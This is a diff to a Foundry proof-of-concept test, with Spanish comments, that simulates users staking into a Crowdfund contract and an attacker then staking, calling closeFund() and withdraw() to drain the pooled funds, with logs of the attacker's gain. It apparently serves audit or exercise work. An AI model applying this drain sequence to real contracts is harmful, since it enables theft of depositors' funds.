@@ -9,6 +9,8 @@ contract ProofOfConcept is Test {
 
     Crowdfund public crowdfundContract;
 
+    uint constant DECIMALS = 10**15;
+
     address public owner = makeAddr("owner");
     address public user1 = makeAddr("user1");
     address public user2 = makeAddr("user2");
@@ -21,14 +23,13 @@ contract ProofOfConcept is Test {
     // La función setUp() es ejecutada antes de cada test para establecer el escenario inicial
     function setUp() public {
         // Aumentamos el balance de cada usuario
-        vm.deal(owner, 1000 ether);
-        vm.deal(user1, 1000 ether);
-        vm.deal(user2, 1000 ether);
-        vm.deal(user3, 1000 ether);
-        vm.deal(user4, 1000 ether);
-        vm.deal(user5, 1000 ether);
-        vm.deal(attacker1, 1000 ether);
-        vm.deal(attacker01, 1000 ether);
+        vm.deal(owner, 300 * DECIMALS);
+        vm.deal(user1, 300 * DECIMALS);
+        vm.deal(user2, 300 * DECIMALS);
+        vm.deal(user3, 300 * DECIMALS);
+        vm.deal(user4, 300 * DECIMALS);
+        vm.deal(user5, 300 * DECIMALS);
+        vm.deal(attacker1, 300 * DECIMALS);
 
         // El owner despliega el contrato
         vm.prank(owner);
@@ -38,61 +39,53 @@ contract ProofOfConcept is Test {
 
     function test_exploit() public {
         
-        console.log("--------------------------------------------------------------------------");
+        console.log("-------------------------------------------------------------------------------");
         console.log(unicode"\n\tLet's simulate the stake of different crowdfunding participants\n");
-        console.log("--------------------------------------------------------------------------");
+        console.log("-------------------------------------------------------------------------------");
         
-        stake(user1, 29 ether);
-        stake(user2, 27 ether);
-        stake(user3, 30 ether);
-        stake(user4, 58 ether);
-        stake(user5, 63 ether);
-        stake(user1, 68 ether);
-        stake(user2, 67 ether);
-        stake(user3, 69 ether);
-        stake(user4, 70 ether);
-        stake(user5, 72 ether);
+        stake(user1, 49 * DECIMALS);
+        stake(user2, 47 * DECIMALS);
+        stake(user3, 50 * DECIMALS);
+        stake(user4, 78 * DECIMALS);
+        stake(user5, 83 * DECIMALS);
+        stake(user1, 88 * DECIMALS);
+        stake(user2, 87 * DECIMALS);
+        stake(user3, 89 * DECIMALS);
+        stake(user4, 90 * DECIMALS);
+        stake(user5, 82 * DECIMALS);
         
-        console.log("--------------------------------------------------------------------------\n"); 
-        console.log(unicode"| => Funds on stake (crowdfund's balance): 👀 %s ether👀", crowdfundContract.getTotalStake()/1 ether);
-        console.log(unicode"| => Attacker's balance                  : 👀 %s ether👀", address(attacker1).balance/1 ether);
-        console.log(unicode"| => Attacker01's balance                : 👀 %s ether👀\n", address(attacker01).balance/1 ether);
-        console.log("--------------------------------------------------------------------------"); 
+        console.log("-------------------------------------------------------------------------------\n"); 
+        console.log(unicode"| => Funds on stake (crowdfund's balance) : 👀 %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
+        console.log(unicode"| => Attacker's balance                   : 👀 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
+        console.log("-------------------------------------------------------------------------------"); 
 
         console.log(unicode"\n\t\t\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 
 
         exploit();
 
-        console.log("--------------------------------------------------------------------------\n"); 
-        console.log(unicode"| => Funds on stake (crowdfund's balance): ☠  %s ether☠", crowdfundContract.getTotalStake()/1 ether);
-        console.log(unicode"| => Attacker's balance                  : 💯 %s ether💯", address(attacker1).balance/1 ether);
-        console.log(unicode"| => Attacker01's balance                : 💯 %s ether💯\n", address(attacker01).balance/1 ether);
-        console.log("--------------------------------------------------------------------------");             
+        console.log("-------------------------------------------------------------------------------\n"); 
+        console.log(unicode"| => Funds on stake (crowdfund's balance) : ☠  %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
+        console.log(unicode"| => Attacker's balance                   : 💯 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
+        console.log("-------------------------------------------------------------------------------");             
     }
     
     function stake(address user, uint amount) internal {
         vm.prank(user);
         crowdfundContract.stake{value: amount}();
-        console.log(unicode"| => Address: %s Stake: %s ether |", address(user), amount/1 ether);
+        console.log(unicode"| => Address: %s Stake: %s * DECIMALS |", address(user), amount/(1 * DECIMALS));
     }
 
     function exploit() internal {
-        vm.prank(attacker01);
-        crowdfundContract.stake{value: 95 ether}();
-        vm.prank(attacker1);
-        crowdfundContract.stake{value: 90 ether}();
-        vm.prank(attacker1);
-        crowdfundContract.stake{value: 95 ether}();
-        vm.prank(attacker01);
-        crowdfundContract.stake{value: 95 ether}();
-        vm.prank(attacker1);
-        crowdfundContract.stake{value: 72 ether}();
+        vm.startPrank(attacker1);
 
-        vm.prank(attacker1);
+        crowdfundContract.stake{value: 100 * DECIMALS}();
+        crowdfundContract.stake{value: 100 * DECIMALS}();
+        crowdfundContract.stake{value: 57 * DECIMALS}();
+
         crowdfundContract.closeFund();
-        vm.prank(attacker1);
         crowdfundContract.withdraw();
-        
+
+        vm.stopPrank();
     }
 
 }
